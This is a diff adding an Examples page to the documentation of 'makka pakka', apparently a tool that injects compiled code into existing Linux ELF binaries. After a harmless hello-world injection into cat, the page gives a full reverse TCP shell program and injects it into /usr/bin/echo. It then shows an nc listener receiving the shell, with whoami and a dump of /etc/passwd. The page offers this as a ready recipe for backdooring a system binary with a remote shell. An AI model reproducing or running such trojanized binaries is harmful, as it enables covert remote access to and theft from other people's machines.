@@ -34,6 +34,149 @@
 
   <section id="examples">
 <h1><strong>Examples</strong><a class="headerlink" href="#examples" title="Permalink to this heading">¶</a></h1>
+<p>This page shows some examples of makka pakka programs, and how they can be
+compiled into a target binary.</p>
+<section id="logging-to-stdout">
+<h2>Logging to Stdout<a class="headerlink" href="#logging-to-stdout" title="Permalink to this heading">¶</a></h2>
+<p><strong>Program file</strong></p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>!link stdlib/syscall.mkpk
+
+[[data]]
+message: &quot;Hello, world!&quot;
+
+[[code]]
+[main]
+&gt; sys_write &quot;message&quot; 14
+&gt; sys_exit
+</pre></div>
+</div>
+<p><strong>Compilation</strong></p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>mkpk<span class="w"> </span>stdlib_write.mkpk<span class="w"> </span>/usr/bin/cat<span class="w"> </span>-o<span class="w"> </span>cat_write<span class="w"> </span>-e
+</pre></div>
+</div>
+<div class="line-block">
+<div class="line"><strong>Usage</strong></div>
+</div>
+<p>Currently the exit process patching only works for sys::exit, and not for
+sys::exit_group. Most ELF binaries use a mixture of the two, so finding a code
+path that runs the injected code is a matter of trying a few different
+arguments. This is a bug, and will be fixed in a future version. For now, the
+cat binary runs the injected code with the –help argument.</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>./cat_write --help
+Usage: ./cat_write [OPTION]... [FILE]...
+Concatenate FILE(s) to standard output.
+
+With no FILE, or when FILE is -, read standard input.
+
+-A, --show-all           equivalent to -vET
+-b, --number-nonblank    number nonempty output lines, overrides -n
+-e                       equivalent to -vE
+-E, --show-ends          display $ at end of each line
+-n, --number             number all output lines
+-s, --squeeze-blank      suppress repeated empty output lines
+-t                       equivalent to -vT
+-T, --show-tabs          display TAB characters as ^I
+-u                       (ignored)
+-v, --show-nonprinting   use ^ and M- notation, except for LFD and TAB
+    --help     display this help and exit
+    --version  output version information and exit
+
+Examples:
+./cat_write f - g  Output f&#39;s contents, then standard input, then g&#39;s contents.
+./cat_write        Copy standard input to standard output.
+
+GNU coreutils online help: &lt;https://www.gnu.org/software/coreutils/&gt;
+Report any translation bugs to &lt;https://translationproject.org/team/&gt;
+Full documentation &lt;https://www.gnu.org/software/coreutils/cat&gt;
+or available locally via: info &#39;(coreutils) cat invocation&#39;
+Hello, world!
+</pre></div>
+</div>
+</section>
+<section id="reverse-tcp-shell">
+<h2>Reverse TCP Shell<a class="headerlink" href="#reverse-tcp-shell" title="Permalink to this heading">¶</a></h2>
+<p><strong>Program File</strong></p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>!link stdlib/network.mkpk
+!link stdlib/syscall.mkpk
+!link stdlib/execve.mkpk
+
+[[data]]
+exit_msg: &quot;Connection Terminated&quot;
+# 5555 in little endian.
+port: 0xb315
+# 127.0.0.1 in little endian.
+addr: 0x0100007f
+
+[[code]]
+[main]
+&gt; socket
+&gt; connect &quot;addr&quot; &quot;port&quot;
+&gt; dup2
+&gt; bin_sh
+&gt; sys_write &quot;exit_msg&quot; 22
+&gt; sys_exit
+</pre></div>
+</div>
+<p><strong>Compilation</strong></p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">mkpk</span> <span class="n">reverse_tcp</span><span class="o">.</span><span class="n">mkpk</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">echo</span> <span class="o">-</span><span class="n">n</span>
+<span class="n">Injecting</span> <span class="n">assembly</span> <span class="kn">from</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="mi">41462</span><span class="n">f2f</span><span class="o">-</span><span class="mi">9</span><span class="n">c7c</span><span class="o">-</span><span class="mi">4</span><span class="n">b8f</span><span class="o">-</span><span class="mi">9848</span><span class="o">-</span><span class="n">c7d2621296d5</span><span class="o">.</span><span class="n">asm</span> <span class="n">into</span> <span class="o">.</span>
+<span class="n">Injected</span> <span class="n">file</span> <span class="n">output</span> <span class="n">to</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ce38b9c2</span><span class="o">-</span><span class="mi">7</span><span class="n">d82</span><span class="o">-</span><span class="mf">4e64</span><span class="o">-</span><span class="n">bf9c</span><span class="o">-</span><span class="n">db8a4c7a7d99</span><span class="o">.</span>
+</pre></div>
+</div>
+<div class="line-block">
+<div class="line"><strong>Usage</strong></div>
+</div>
+<p>In a seperate terminal:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">nc</span> <span class="o">-</span><span class="n">l</span> <span class="n">localhost</span> <span class="mi">5555</span>
+</pre></div>
+</div>
+<p>Then run the inject echo binary:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ce38b9c2</span><span class="o">-</span><span class="mi">7</span><span class="n">d82</span><span class="o">-</span><span class="mf">4e64</span><span class="o">-</span><span class="n">bf9c</span><span class="o">-</span><span class="n">db8a4c7a7d99</span>
+</pre></div>
+</div>
+<p>Now the netcat listener has a remote tcp shell.</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">nc</span> <span class="o">-</span><span class="n">l</span> <span class="n">localhost</span> <span class="mi">5555</span>
+<span class="n">whoami</span>
+<span class="n">alex</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span>
+<span class="n">root</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="n">root</span><span class="p">:</span><span class="o">/</span><span class="n">root</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
+<span class="n">daemon</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="n">daemon</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="nb">bin</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">2</span><span class="p">:</span><span class="mi">2</span><span class="p">:</span><span class="nb">bin</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">sys</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">3</span><span class="p">:</span><span class="mi">3</span><span class="p">:</span><span class="n">sys</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">sync</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">4</span><span class="p">:</span><span class="mi">65534</span><span class="p">:</span><span class="n">sync</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sync</span>
+<span class="n">games</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">5</span><span class="p">:</span><span class="mi">60</span><span class="p">:</span><span class="n">games</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">games</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">man</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">6</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="n">man</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">cache</span><span class="o">/</span><span class="n">man</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">lp</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">7</span><span class="p">:</span><span class="mi">7</span><span class="p">:</span><span class="n">lp</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">lpd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">mail</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">8</span><span class="p">:</span><span class="mi">8</span><span class="p">:</span><span class="n">mail</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">mail</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">news</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">9</span><span class="p">:</span><span class="mi">9</span><span class="p">:</span><span class="n">news</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">news</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">uucp</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">10</span><span class="p">:</span><span class="mi">10</span><span class="p">:</span><span class="n">uucp</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">uucp</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">proxy</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="n">proxy</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">backup</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="n">backup</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">backups</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="nb">list</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">38</span><span class="p">:</span><span class="mi">38</span><span class="p">:</span><span class="n">Mailing</span> <span class="n">List</span> <span class="n">Manager</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="nb">list</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">irc</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="n">ircd</span><span class="p">:</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">ircd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">gnats</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">41</span><span class="p">:</span><span class="mi">41</span><span class="p">:</span><span class="n">Gnats</span> <span class="n">Bug</span><span class="o">-</span><span class="n">Reporting</span> <span class="n">System</span> <span class="p">(</span><span class="n">admin</span><span class="p">):</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">gnats</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">nobody</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">65534</span><span class="p">:</span><span class="mi">65534</span><span class="p">:</span><span class="n">nobody</span><span class="p">:</span><span class="o">/</span><span class="n">nonexistent</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">systemd</span><span class="o">-</span><span class="n">network</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">100</span><span class="p">:</span><span class="mi">102</span><span class="p">:</span><span class="n">systemd</span> <span class="n">Network</span> <span class="n">Management</span><span class="p">,,,:</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">systemd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">systemd</span><span class="o">-</span><span class="n">resolve</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">101</span><span class="p">:</span><span class="mi">103</span><span class="p">:</span><span class="n">systemd</span> <span class="n">Resolver</span><span class="p">,,,:</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">systemd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">messagebus</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">102</span><span class="p">:</span><span class="mi">105</span><span class="p">::</span><span class="o">/</span><span class="n">nonexistent</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">systemd</span><span class="o">-</span><span class="n">timesync</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">103</span><span class="p">:</span><span class="mi">106</span><span class="p">:</span><span class="n">systemd</span> <span class="n">Time</span> <span class="n">Synchronization</span><span class="p">,,,:</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">systemd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">syslog</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">104</span><span class="p">:</span><span class="mi">111</span><span class="p">::</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">syslog</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">_apt</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">105</span><span class="p">:</span><span class="mi">65534</span><span class="p">::</span><span class="o">/</span><span class="n">nonexistent</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">uuidd</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">106</span><span class="p">:</span><span class="mi">112</span><span class="p">::</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">uuidd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">tcpdump</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">107</span><span class="p">:</span><span class="mi">113</span><span class="p">::</span><span class="o">/</span><span class="n">nonexistent</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">alex</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">1000</span><span class="p">:</span><span class="mi">1000</span><span class="p">:,,,:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">alex</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
+</pre></div>
+</div>
+<div class="admonition seealso">
+<p class="admonition-title">See also</p>
+<ul class="simple">
+<li><p><a class="reference internal" href="installation.html"><span class="doc">Installation</span></a></p></li>
+<li><p><a class="reference internal" href="usage.html"><span class="doc">Usage</span></a></p></li>
+<li><p><a class="reference internal" href="language_spec.html"><span class="doc">Language Features</span></a></p></li>
+</ul>
+</div>
+</section>
 </section>
 
 
@@ -57,7 +200,11 @@
 <li class="toctree-l1"><a class="reference internal" href="installation.html"><strong>Installation</strong></a></li>
 <li class="toctree-l1"><a class="reference internal" href="usage.html"><strong>Usage</strong></a></li>
 <li class="toctree-l1"><a class="reference internal" href="language_spec.html"><strong>Language Features</strong></a></li>
-<li class="toctree-l1 current"><a class="current reference internal" href="#"><strong>Examples</strong></a></li>
+<li class="toctree-l1 current"><a class="current reference internal" href="#"><strong>Examples</strong></a><ul>
+<li class="toctree-l2"><a class="reference internal" href="#logging-to-stdout">Logging to Stdout</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#reverse-tcp-shell">Reverse TCP Shell</a></li>
+</ul>
+</li>
 <li class="toctree-l1"><a class="reference internal" href="compilation.html"><strong>Compilation Process</strong></a></li>
 <li class="toctree-l1"><a class="reference internal" href="data_structures.html"><strong>Data Structures</strong></a></li>
 <li class="toctree-l1"><a class="reference internal" href="public_api.html"><strong>Public API</strong></a></li>
